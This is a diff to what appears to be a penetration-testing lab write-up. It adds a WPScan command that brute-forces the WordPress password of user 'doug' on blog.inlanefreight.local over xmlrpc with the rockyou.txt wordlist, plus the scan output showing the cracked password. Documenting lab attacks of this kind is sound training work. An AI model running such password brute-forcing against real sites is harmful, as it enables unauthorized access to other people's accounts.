@@ -36,7 +36,40 @@ categories:
 
 The following figure shows WPScan and the `rockyou.txt` password list against `blog.inlanefreight.local` to brute-force the password for the user account `doug`. `xmlrpc` is used as it is faster than HTTP-based password brute-forcing.
 
+```
+wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -t 20 -U doug -P ~/Sauce/SecLists/Passwords/rockyou.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://blog.inlanefreight.local/ [10.129.107.187]
+[+] Started: Fri Oct 27 08:51:01 2023
+
+...
+
+[!] Valid Combinations Found:
+ | Username: doug, Password: jessica1
+
+...
+
+[+] Finished: Fri Oct 27 08:51:40 2023
+[+] Requests Done: 799
+[+] Cached Requests: 41
+[+] Data Sent: 393.439 KB
+[+] Data Received: 448.799 KB
+[+] Memory used: 284.395 MB
+[+] Elapsed time: 00:00:38
+```
 
 ## `blog.inlanefreight.local`
 
